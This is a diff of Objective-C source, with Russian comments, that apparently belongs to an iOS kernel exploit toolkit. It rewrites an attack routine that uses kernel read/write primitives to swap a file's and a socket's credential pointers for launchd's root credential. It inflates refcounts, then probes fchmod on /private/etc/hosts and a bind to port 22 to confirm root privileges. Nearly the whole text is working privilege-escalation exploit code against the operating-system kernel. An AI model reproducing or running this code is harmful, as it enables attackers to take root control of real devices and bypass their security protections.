@@ -2299,166 +2299,129 @@ static NSString *kpFmtSptmFn(uint64_t raw)
 + (NSString *)fgAttackReport
 {
     NSMutableString *r = [NSMutableString string];
-    [r appendString:@"\n=== FGATTACK: f_cred swap (kwrite-only) ===\n"];
+    [r appendString:@"\n=== ATTACK v3: tight-window cred swaps (kwrite-only) ===\n"];
     if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
         [r appendString:@"[RESULT] АТАКА: FAIL — KRW не активна, сначала эксплойт.\n"];
         return r;
     }
-    // 2.0.50: proc_self() НЕ зовём — его цепь (1:1 kutils) кидает мусор в
-    // kread (FATAL 0x3e8/0x18 в каждом логе) и лотереей убивает ядро.
-    // Свой proc берём только safe-walk'ом по allproc.
+    kpNote(r, @"  [ATK] step1: resolve proc");
     uint64_t selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
-    // findProcByPid намеренно не используем — его EXP-01 zone-route валит девайс
-    if (!selfProc) { [r appendString:@"[RESULT] АТАКА: FAIL — свой proc не найден\n"]; return r; }
+    if (!selfProc) { [r appendString:@"[RESULT] АТАКА: FAIL — proc\n"]; return r; }
     uint64_t procRo = kp_untag_ptr(early_kread64(selfProc + koffsetof(proc, proc_ro)));
     uint64_t curUcred = kpLooksLikeKernelPointer(procRo) ? kp_untag_ptr(early_kread64(procRo + koffsetof(proc_ro, ucred))) : 0;
-    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] proc=%#llx proc_ro=%#llx ucred=%#llx", (unsigned long long)selfProc, (unsigned long long)procRo, (unsigned long long)curUcred]);
-    if (!kpLooksLikeKernelPointer(curUcred)) { [r appendString:@"[RESULT] АТАКА: FAIL — ucred не найден\n"]; return r; }
-    kpNote(r, @"  [FGATTACK] step2: ucred найден");
-    // --- FGATTACK body (kwrite-only, type-gated) ---
-            {
-                uint64_t ldProc = [self findSelfProcByPidFast:1 log:nil];
-                uint64_t rootZVA = 0;
-                if (kpLooksLikeKernelPointer(ldProc)) {
-                    uint64_t ldRo = kp_untag_ptr(early_kread64(ldProc + koffsetof(proc, proc_ro)));
-                    uint64_t ldUc = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + koffsetof(proc_ro, ucred))) : 0;
-                    uint32_t ldUid = ldUc ? (uint32_t)early_kread64(ldUc + 0x18) : 0xffff;
-                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] launchd ucred=%#llx uid=%u", (unsigned long long)ldUc, ldUid]);
-                    if (ldUid == 0 && kpLooksLikeKernelPointer(ldUc)) rootZVA = ldUc;
-                }
-                kpNote(r, @"  [FGATTACK] step3: открываю hosts");
-                int tfd = open("/private/etc/hosts", O_RDONLY);
-                kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] rootZVA=%#llx hosts fd=%d", (unsigned long long)rootZVA, tfd]);
-                uint64_t fpRaw = 0, globRaw = 0, fdOf = 0;
-                if (tfd >= 0 && rootZVA && selfProc) {
-                    kpRead(selfProc + 0xF8, &fdOf, 8, "fd_ofiles", r);
-                    uint64_t ofiles = kp_untag_ptr(fdOf);
-                    if (kpLooksLikeKernelPointer(ofiles))
-                        kpRead(ofiles + (uint64_t)tfd * 8, &fpRaw, 8, "ofiles[fd]", r);
-                    uint64_t fp = kp_untag_ptr(fpRaw);
-                    if (kpLooksLikeKernelPointer(fp))
-                        kpRead(fp + off_fileproc_fp_glob, &globRaw, 8, "fileproc.glob", r);
-                    uint64_t glob = kp_untag_ptr(globRaw);
-                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileproc=%#llx fileglob=%#llx", (unsigned long long)fp, (unsigned long long)glob]);
-                    uint32_t fgOff = 0xFFFFFFFF;
-                    if (kpLooksLikeKernelPointer(glob)) {
-                        // 2.0.47: сравнение ПОСЛЕ untag — в поле лежит
-                        // тегированный указатель; и скан шире (0x400).
-                        for (uint32_t o = 0; o + 8 <= 0x400; o += 8)
-                            if (kp_untag_ptr(early_kread64(glob + o)) == curUcred) { fgOff = o; break; }
-                        kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred offset=%@",
-                                  fgOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", fgOff] : @"not found"]);
-                    }
-                    kpNote(r, @"  [FGATTACK] step4: fg_cred измерен, запускаю walker (kvtophys) — следующая строка либо type, либо ребут");
-                    // 2.0.47: frame table VA — без неё kpFrameTypeOf даёт -1
-                    // и kwrite блокируется. Берём из symbols напрямую.
-                    if (!gFrameTableVA) {
-                        uint64_t ft = kread_ptr(ksymbol(libsptm_frame_table));
-                        if (kpLooksLikeKernelPointer(ft)) { gFrameTableVA = ft; kpSetFrameTableVA(ft); }
-                        kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] frame table VA=%#llx (init)", (unsigned long long)ft]);
-                    }
-                    uint64_t globPA = kpLooksLikeKernelPointer(glob) ? kvtophys(glob & ~0x3fffULL) : 0;
-                    kpNote(r, @"  [FGATTACK] step5: walker выжил");
-                    int globT = globPA ? kpFrameTypeOf(globPA) : -1;
-                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileglob pagePA=%#llx type=%d — kwrite %@",
-                              (unsigned long long)globPA, globT,
-                              globT == 0x21 ? @"allowed (0x21)" : @"BLOCKED (not 0x21 - skipped, no panic)"]);
-                    if (fgOff != 0xFFFFFFFF && globT == 0x21) {
-                        uint64_t old = early_kread64(glob + fgOff);
-                        early_kwrite64(glob + fgOff, rootZVA);
-                        uint64_t rb = early_kread64(glob + fgOff);
-                        int ch = fchmod(tfd, 0644);
-                        int ch2 = fchown(tfd, 0, 0);
-                        kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred->root: readback=%#llx fchmod=%d fchown=%d errno=%d — %@",
-                                  (unsigned long long)rb, ch, ch2, errno,
-                                  (rb == rootZVA && (ch == 0 || ch2 == 0)) ? @"ROOT-FS WIN" : @"miss"]);
-                        if (ch == 0 || ch2 == 0) {
-                            kpNote(r, @"=== ROOT (filesystem) WIN: f_cred authorization passes as root ===");
-                        }
-                        // 2.0.48: пробы того, что реально слушает f_cred.
-                        // fchmod/fchown авторизуются через cred ПРОЦЕССА (EPERM —
-                        // факт из 2.0.47). Пробуем file-op авторизации:
-                        if (rb == rootZVA) {
-                            struct timeval tv[2]; gettimeofday(&tv[0], NULL); tv[1] = tv[0];
-                            int pFut = futimes(tfd, tv);
-                            int pFlg = fchflags(tfd, 0);
-                            struct flock fl; memset(&fl, 0, sizeof(fl)); fl.l_type = F_WRLCK; fl.l_whence = SEEK_SET;
-                            int pLck = fcntl(tfd, F_SETLK, &fl);
-                            int pFl2 = fcntl(tfd, F_SETFL, O_NONBLOCK);
-                            kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] f_cred-пробы: futimes=%d fchflags=%d F_SETLK=%d F_SETFL=%d errno=%d",
-                                      pFut, pFlg, pLck, pFl2, errno]);
-                            if (pFut == 0 || pFlg == 0 || pLck == 0) {
-                                kpNote(r, @"=== ROOT-FS WIN: хотя бы одна f_cred-авторизация прошла ===");
-                            }
-                        }
-                        early_kwrite64(glob + fgOff, old);
-                    }
-                }
-                if (tfd >= 0) close(tfd);
-            }
-            // 2.0.49: so_cred свап на СВЕЖЕМ сокете. Важный урок 2.0.48:
-            // setsockopt на controlSocket = syscall по повреждённому KRW-inpcb
-            // → мгновенный ребут. KRW-сокет НЕ ТРОГАЕМ вообще; все пробы
-            // идут на новом AF_INET сокете, у которого so_cred измеряем и
-            // свапаем тем же kwrite (0x21-gated), restore до close.
-            {
-                extern uint64_t rwSocketPcb;
-                uint64_t rootZVA = 0;
-                {
-                    uint64_t ldP = [self findSelfProcByPidFast:1 log:nil];
-                    uint64_t ldRo = kpLooksLikeKernelPointer(ldP) ? kp_untag_ptr(early_kread64(ldP + koffsetof(proc, proc_ro))) : 0;
-                    uint64_t ldUc = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + koffsetof(proc_ro, ucred))) : 0;
-                    if (ldUc && (uint32_t)early_kread64(ldUc + 0x18) == 0) rootZVA = ldUc;
-                }
-                int ts = socket(AF_INET, SOCK_DGRAM, 0);
-                kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] свежий сокет fd=%d rootZVA=%#llx", ts, (unsigned long long)rootZVA]);
-                uint64_t sGlob = 0, sFpRaw = 0, sFdOf = 0, sVA = 0;
-                if (ts >= 0 && rootZVA && selfProc) {
-                    kpRead(selfProc + 0xF8, &sFdOf, 8, "fd_ofiles", r);
-                    uint64_t ofiles2 = kp_untag_ptr(sFdOf);
-                    if (kpLooksLikeKernelPointer(ofiles2))
-                        kpRead(ofiles2 + (uint64_t)ts * 8, &sFpRaw, 8, "ofiles[ts]", r);
-                    uint64_t fp2 = kp_untag_ptr(sFpRaw);
-                    if (kpLooksLikeKernelPointer(fp2))
-                        kpRead(fp2 + off_fileproc_fp_glob, &sGlob, 8, "fileproc.glob", r);
-                    uint64_t glob2 = kp_untag_ptr(sGlob);
-                    // сокет = fg_data файла (fileglob+0x38, проверено в necp-цепи)
-                    uint64_t datRaw = 0;
-                    if (kpLooksLikeKernelPointer(glob2))
-                        kpRead(glob2 + 0x38, &datRaw, 8, "fileglob.data", r);
-                    sVA = kp_untag_ptr(datRaw);
-                    kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] fileglob=%#llx socket=%#llx", (unsigned long long)glob2, (unsigned long long)sVA]);
-                }
-                uint64_t sPA = kpLooksLikeKernelPointer(sVA) ? kvtophys(sVA & ~0x3fffULL) : 0;
-                int sT = sPA ? kpFrameTypeOf(sPA) : -1;
-                uint32_t socOff = 0xFFFFFFFF;
-                if (kpLooksLikeKernelPointer(sVA)) {
-                    for (uint32_t o = 0; o + 8 <= 0x300; o += 8)
-                        if (kp_untag_ptr(early_kread64(sVA + o)) == curUcred) { socOff = o; break; }
-                }
-                kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] socket pagePA=%#llx тип=%d so_cred offset=%@",
-                          (unsigned long long)sPA, sT,
-                          socOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", socOff] : @"not found"]);
-                if (socOff != 0xFFFFFFFF && sT == 0x21 && rootZVA) {
-                    uint64_t old = early_kread64(sVA + socOff);
-                    early_kwrite64(sVA + socOff, rootZVA);
-                    uint64_t rb2 = early_kread64(sVA + socOff);
-                    int one = 1;
-                    int pHdr = setsockopt(ts, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-                    struct sockaddr_in sin; memset(&sin, 0, sizeof(sin));
-                    sin.sin_family = AF_INET; sin.sin_port = htons(22); sin.sin_addr.s_addr = htonl(INADDR_ANY);
-                    int pBind = bind(ts, (struct sockaddr *)&sin, sizeof(sin));
-                    kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] so_cred->root: readback=%#llx IP_HDRINCL=%d bind22=%d errno=%d — %@",
-                              (unsigned long long)rb2, pHdr, pBind, errno,
-                              (rb2 == rootZVA && (pHdr == 0 || pBind == 0)) ? @"SOCKET-ROOT WIN" : (rb2 == rootZVA ? @"свап держится, пробы мимо" : @"не прилипло")]);
-                    if (pHdr == 0 || pBind == 0) kpNote(r, @"=== SOCKET-ROOT WIN: сокетная привилегия прошла от имени root ===");
-                    early_kwrite64(sVA + socOff, old);
-                } else {
-                    kpNote(r, @"  [SOATTACK] пропуск: тип не 0x21 / so_cred не найден / нет rootZVA");
-                }
-                if (ts >= 0) close(ts);
-            }
+    kpNote(r, [NSString stringWithFormat:@"  [ATK] step2: ucred=%#llx", (unsigned long long)curUcred]);
+    if (!kpLooksLikeKernelPointer(curUcred)) { [r appendString:@"[RESULT] АТАКА: FAIL — ucred\n"]; return r; }
+    uint64_t rootZVA = 0;
+    {
+        uint64_t ldP = [self findSelfProcByPidFast:1 log:nil];
+        uint64_t ldRo = kpLooksLikeKernelPointer(ldP) ? kp_untag_ptr(early_kread64(ldP + koffsetof(proc, proc_ro))) : 0;
+        uint64_t ldUc = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + koffsetof(proc_ro, ucred))) : 0;
+        if (ldUc && (uint32_t)early_kread64(ldUc + 0x18) == 0) rootZVA = ldUc;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  [ATK] step3: rootZVA=%#llx", (unsigned long long)rootZVA]);
+    if (!rootZVA) { [r appendString:@"[RESULT] АТАКА: FAIL — root cred\n"]; return r; }
+
+    // ---- refcount-инфлейт (ucred_rw+0 — пишущийся счётчик, тип 0x21) ----
+    uint64_t myRW = kp_untag_ptr(early_kread64(curUcred + 0x00));
+    uint64_t rootRW = kp_untag_ptr(early_kread64(rootZVA + 0x00));
+    uint64_t myRWpa = kpLooksLikeKernelPointer(myRW) ? kvtophys(myRW & ~0x3fffULL) : 0;
+    uint64_t rootRWpa = kpLooksLikeKernelPointer(rootRW) ? kvtophys(rootRW & ~0x3fffULL) : 0;
+    uint64_t myRWk = 0, rootRWk = 0, myRef0 = 0, rootRef0 = 0;
+    BOOL refsOK = NO;
+    if (myRWpa && rootRWpa && kpFrameTypeOf(myRWpa) == 0x21 && kpFrameTypeOf(rootRWpa) == 0x21) {
+        myRWk = phystokv(myRWpa); rootRWk = phystokv(rootRWpa);
+        myRef0 = early_kread64(myRWk + (myRW & 0x3fff));
+        rootRef0 = early_kread64(rootRWk + (rootRW & 0x3fff));
+        early_kwrite64(myRWk + (myRW & 0x3fff), myRef0 + 0x10000);
+        early_kwrite64(rootRWk + (rootRW & 0x3fff), rootRef0 + 0x10000);
+        refsOK = (early_kread64(myRWk + (myRW & 0x3fff)) == myRef0 + 0x10000);
+        kpNote(r, [NSString stringWithFormat:@"  [ATK] step4: refcount inflate %@", refsOK ? @"OK ★" : @"FAIL"]);
+    } else {
+        kpNote(r, @"  [ATK] step4: refcount-инфлейт пропущен (ucred_rw не 0x21)");
+    }
+
+    // ---- FGATTACK: свап → ОДНА проба → restore ----
+    int tfd = open("/private/etc/hosts", O_RDONLY);
+    kpNote(r, [NSString stringWithFormat:@"  [ATK] step5: hosts fd=%d", tfd]);
+    uint64_t glob = 0;
+    if (tfd >= 0 && selfProc) {
+        uint64_t fdOf = 0, fpRaw = 0, globRaw = 0;
+        kpRead(selfProc + 0xF8, &fdOf, 8, "fd_ofiles", r);
+        uint64_t ofiles = kp_untag_ptr(fdOf);
+        if (kpLooksLikeKernelPointer(ofiles)) kpRead(ofiles + (uint64_t)tfd * 8, &fpRaw, 8, "ofiles[fd]", r);
+        uint64_t fp = kp_untag_ptr(fpRaw);
+        if (kpLooksLikeKernelPointer(fp)) kpRead(fp + off_fileproc_fp_glob, &globRaw, 8, "fileproc.glob", r);
+        glob = kp_untag_ptr(globRaw);
+    }
+    uint32_t fgOff = 0xFFFFFFFF;
+    if (kpLooksLikeKernelPointer(glob)) {
+        for (uint32_t o = 0; o + 8 <= 0x400; o += 8)
+            if (kp_untag_ptr(early_kread64(glob + o)) == curUcred) { fgOff = o; break; }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  [ATK] step6: fileglob=%#llx fg_cred=%@",
+              (unsigned long long)glob, fgOff != 0xFFFFFFFF ? @"FOUND ★" : @"not found"]);
+    if (fgOff != 0xFFFFFFFF && kpLooksLikeKernelPointer(glob)) {
+        uint64_t gPA = kvtophys(glob & ~0x3fffULL);
+        int gT = gPA ? kpFrameTypeOf(gPA) : -1;
+        kpNote(r, [NSString stringWithFormat:@"  [ATK] step7: fileglob type=%d", gT]);
+        if (gT == 0x21) {
+            uint64_t old = early_kread64(glob + fgOff);
+            early_kwrite64(glob + fgOff, rootZVA);
+            int ch = fchmod(tfd, 0644);   // одна проба, мгновенно
+            early_kwrite64(glob + fgOff, old);   // restore СРАЗУ
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step8: fg swap → fchmod=%d errno=%d → restored — %@",
+                      ch, errno, ch == 0 ? @"ROOT-FS WIN ★★" : @"проба мимо (process-cred авторизация)"]);
+            if (ch == 0) kpNote(r, @"=== ROOT (filesystem) WIN ===");
+        }
+    }
+    if (tfd >= 0) close(tfd);
+
+    // ---- SOATTACK: свежий сокет, свап → одна проба → restore ----
+    extern uint64_t rwSocketPcb;
+    int ts = socket(AF_INET, SOCK_DGRAM, 0);
+    kpNote(r, [NSString stringWithFormat:@"  [ATK] step9: fresh socket fd=%d", ts]);
+    if (ts >= 0 && selfProc) {
+        uint64_t fdOf2 = 0, fpRaw2 = 0, globRaw2 = 0, datRaw = 0;
+        kpRead(selfProc + 0xF8, &fdOf2, 8, "fd_ofiles", r);
+        uint64_t of2 = kp_untag_ptr(fdOf2);
+        if (kpLooksLikeKernelPointer(of2)) kpRead(of2 + (uint64_t)ts * 8, &fpRaw2, 8, "ofiles[ts]", r);
+        uint64_t fp2 = kp_untag_ptr(fpRaw2);
+        if (kpLooksLikeKernelPointer(fp2)) kpRead(fp2 + off_fileproc_fp_glob, &globRaw2, 8, "glob", r);
+        uint64_t gl2 = kp_untag_ptr(globRaw2);
+        if (kpLooksLikeKernelPointer(gl2)) kpRead(gl2 + 0x38, &datRaw, 8, "fg_data", r);
+        uint64_t sVA = kp_untag_ptr(datRaw);
+        uint32_t socOff = 0xFFFFFFFF;
+        if (kpLooksLikeKernelPointer(sVA)) {
+            for (uint32_t o = 0; o + 8 <= 0x300; o += 8)
+                if (kp_untag_ptr(early_kread64(sVA + o)) == curUcred) { socOff = o; break; }
+        }
+        uint64_t sPA = kpLooksLikeKernelPointer(sVA) ? kvtophys(sVA & ~0x3fffULL) : 0;
+        int sT = sPA ? kpFrameTypeOf(sPA) : -1;
+        kpNote(r, [NSString stringWithFormat:@"  [ATK] step10: socket=%#llx type=%d so_cred=%@",
+                  (unsigned long long)sVA, sT, socOff != 0xFFFFFFFF ? @"FOUND ★" : @"not found"]);
+        if (socOff != 0xFFFFFFFF && sT == 0x21) {
+            uint64_t old = early_kread64(sVA + socOff);
+            early_kwrite64(sVA + socOff, rootZVA);
+            struct sockaddr_in sin; memset(&sin, 0, sizeof(sin));
+            sin.sin_family = AF_INET; sin.sin_port = htons(22); sin.sin_addr.s_addr = htonl(INADDR_ANY);
+            int pBind = bind(ts, (struct sockaddr *)&sin, sizeof(sin));
+            early_kwrite64(sVA + socOff, old);   // restore СРАЗУ
+            kpNote(r, [NSString stringWithFormat:@"  [ATK] step11: so swap → bind22=%d errno=%d → restored — %@",
+                      pBind, errno, pBind == 0 ? @"SOCKET-ROOT WIN ★★" : @"проба мимо"]);
+            if (pBind == 0) kpNote(r, @"=== SOCKET-ROOT WIN ===");
+        }
+    }
+    if (ts >= 0) close(ts);
+
+    // ---- refcount-дефлейт ----
+    if (refsOK) {
+        early_kwrite64(myRWk + (myRW & 0x3fff), myRef0);
+        early_kwrite64(rootRWk + (rootRW & 0x3fff), rootRef0);
+        kpNote(r, @"  [ATK] step12: refcount restored");
+    }
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK] выше\n"];
     return r;
+
 }
 
 + (NSString *)ucredHeapSwapReport
